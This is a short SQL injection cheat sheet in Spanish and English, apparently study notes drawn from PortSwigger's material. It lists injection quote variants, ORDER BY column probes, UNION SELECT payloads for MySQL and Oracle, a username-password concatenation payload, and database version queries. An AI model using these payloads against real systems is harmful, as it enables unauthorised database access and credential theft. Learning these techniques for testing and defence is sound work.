# COMMON ATTACKS
Tener en cuenta que no siempre comienza con ' si no con ", )", )', etc...

WHERE QUERY: ```SELECT * FROM USERS WHERE username= '???'```

LOGIN QUERY: ```SELECT * FROM USERS WHERE username= '???' AND password= '???'```

# UNION ATTACK
COMMON QUERY: ```SELECT a, b FROM table1 UNION SELECT c, d FROM table2```

Determinar el número de columnas: ```' ORDER BY 1--```

MySQL: ```' UNION SELECT '1','2','3','4'-- -```
ORACLE: ```' UNION SELECT NULL FROM DUAL--```

CONCATENATION:  ```' UNION SELECT username || '~' || password FROM users-- ```

# EXTRAER INFORMACIÓN DE LA DB

| Database type | Query |
|---------------|-------|
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

# Referencias
- [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
